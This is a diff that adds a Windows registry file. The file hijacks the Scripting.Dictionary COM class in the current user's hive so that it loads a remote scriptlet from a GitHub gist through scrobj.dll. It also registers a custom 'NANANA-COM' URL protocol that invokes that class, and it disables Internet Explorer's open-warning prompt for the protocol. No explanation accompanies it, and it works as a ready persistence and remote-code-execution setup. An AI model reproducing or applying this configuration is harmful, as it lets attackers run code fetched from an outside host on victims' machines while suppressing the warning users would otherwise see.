@@ -1,0 +1,58 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\ProtocolExecute\NANANA-COM]
+"WarnOnOpen"=dword:00000000
+
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]
+@=""
+
+[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]
+@="{00000001-0000-0000-0000-0000FEEDACDC}"
+
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
+@="Scripting.Dictionary"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
+@="C:\\WINDOWS\\system32\\scrobj.dll"
+"ThreadingModel"="Apartment"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
+@="Scripting.Dictionary"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
+@="https://gist.githubusercontent.com/homjxi0e/1d83ba70f3bbf27daf2e6a390a099bcf/raw/d9b5cbfb16111684416e18782c8a564943d703db/lol2.sct
+
+"
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
+@="Scripting.Dictionary"
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\NANANA-COM]
+@="URL:scripting.dictionary"
+"URL Protocol"="scripting.dictionary"
+
+[HKEY_CURRENT_USER\Software\Classes\NANANA-COM\Application]
+"ApplicationCompany"="@{windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy?ms-resource://windows.immersivecontrolpanel/Resources/PublisherDisplayName}"
+"ApplicationDescription"="@{windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy?ms-resource://windows.immersivecontrolpanel/Resources/TileDescription}"
+"ApplicationIcon"="@{windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy?ms-resource://windows.immersivecontrolpanel/Files/images/logo.png}"
+"ApplicationName"="@{windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy?ms-resource://windows.immersivecontrolpanel/Resources/TileDisplayName}"
+"AppUserModelId"="windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel"
+
+[HKEY_CURRENT_USER\Software\Classes\NANANA-COM\DefaultIcon]
+@="@{windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy?ms-resource://windows.immersivecontrolpanel/Files/images/logo.png}"
+
+[HKEY_CURRENT_USER\Software\Classes\NANANA-COM\Shell]
+
+[HKEY_CURRENT_USER\Software\Classes\NANANA-COM\Shell\Open]
+"ActivatableClassId"="microsoft.windows.immersivecontrolpanel"
+"ContractId"="Windows.Protocol"
+"DesiredInitialViewState"=dword:00000000
+"PackageId"="windows.immersivecontrolpanel_10.0.2.1000_neutral_neutral_cw5n1h2txyewy"
+
+[HKEY_CURRENT_USER\Software\Classes\NANANA-COM\Shell\Open\Command]
+"DelegateExecute"="scripting.dictionary"
+@=" "
